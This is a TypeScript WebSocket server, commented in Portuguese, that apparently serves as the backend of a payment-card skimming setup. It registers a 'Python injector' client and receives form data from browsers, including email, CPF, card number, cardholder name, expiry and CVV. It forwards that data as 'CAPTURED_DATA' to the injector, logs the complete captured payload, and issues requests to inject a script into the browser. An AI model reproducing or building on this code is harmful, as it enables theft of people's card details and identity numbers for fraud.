import { Server as HTTPServer } from "http";
import { WebSocketServer, WebSocket } from "ws";

interface ConnectedClient {
  ws: WebSocket;
  id: string;
  type: "python" | "browser";
  metadata?: Record<string, any>;
}

class WebSocketManager {
  private clients: ConnectedClient[] = [];
  private wss: WebSocketServer;

  constructor(server: HTTPServer) {
    this.wss = new WebSocketServer({ server, path: "/ws" });
    this.setupHandlers();
  }

  private setupHandlers() {
    this.wss.on("connection", (ws: WebSocket) => {
      const clientId = Math.random().toString(36).substring(7);

      console.log(`🔗 Nova conexão WebSocket: ${clientId}`);

      ws.on("message", (message: string) => {
        try {
          const data = JSON.parse(message.toString());

          // Identifica o tipo de cliente
          if (data.type === "PYTHON_INJECTOR") {
            const existingIndex = this.clients.findIndex(
              (c) => c.type === "python",
            );
            if (existingIndex !== -1) {
              this.clients[existingIndex].ws.close();
              this.clients.splice(existingIndex, 1);
            }

            this.clients.push({ ws, id: clientId, type: "python" });
            console.log("✅ Cliente Python conectado (Injetor)");
            ws.send(
              JSON.stringify({
                type: "ACK",
                message: "Conectado ao backend Express",
              }),
            );
          } else if (data.type === "CARD_DATA_UPDATE") {
            // Dados do formulário vindo do navegador
            console.log("📊 Dados de formulário recebidos:", {
              email: data.payload.email ? "✅" : "❌",
              cpf: data.payload.cpf ? "✅" : "❌",
              cardNumber: data.payload.cardNumber ? "✅" : "❌",
              cardholderName: data.payload.cardholderName ? "✅" : "❌",
              expiryMonth: data.payload.expiryMonth ? "✅" : "❌",
              expiryYear: data.payload.expiryYear ? "✅" : "❌",
              cvv: data.payload.cvv ? "✅" : "❌",
            });

            // Envia para o cliente Python se estiver conectado
            const pythonClient = this.clients.find((c) => c.type === "python");
            if (pythonClient) {
              pythonClient.ws.send(
                JSON.stringify({
                  type: "CAPTURED_DATA",
                  payload: data.payload,
                  timestamp: new Date().toISOString(),
                }),
              );
            }
          } else if (data.type === "CAPTURE_COMPLETE") {
            console.log("✅ Captura completa de dados");
            console.log("Dados capturados:", data.payload);

            // Envia para o Python
            const pythonClient = this.clients.find((c) => c.type === "python");
            if (pythonClient) {
              pythonClient.ws.send(
                JSON.stringify({
                  type: "CAPTURE_COMPLETE",
                  payload: data.payload,
                }),
              );
            }
          } else if (data.type === "INJECT_RESPONSE") {
            // Resposta do Python sobre injeção
            if (data.success) {
              console.log("✅ Script injetado com sucesso no navegador");
            } else {
              console.log("❌ Falha ao injetar script");
            }
          }
        } catch (error) {
          console.error("❌ Erro ao processar mensagem:", error);
        }
      });

      ws.on("close", () => {
        const index = this.clients.findIndex((c) => c.id === clientId);
        if (index !== -1) {
          const clientType = this.clients[index].type;
          this.clients.splice(index, 1);
          console.log(`❌ Cliente ${clientType} desconectado: ${clientId}`);
        }
      });

      ws.on("error", (error) => {
        console.error(`❌ Erro WebSocket ${clientId}:`, error.message);
      });
    });
  }

  public requestBrowserInjection() {
    const pythonClient = this.clients.find((c) => c.type === "python");
    if (pythonClient && pythonClient.ws.readyState === 1) {
      pythonClient.ws.send(
        JSON.stringify({
          type: "INJECT_REQUEST",
          timestamp: new Date().toISOString(),
        }),
      );
      console.log("📨 Requisição de injeção enviada ao Python");
      return true;
    }
    return false;
  }

  public getClients() {
    return this.clients;
  }

  public broadcastMessage(message: Record<string, any>) {
    this.clients.forEach((client) => {
      if (client.ws.readyState === 1) {
        client.ws.send(JSON.stringify(message));
      }
    });
  }
}

export { WebSocketManager };
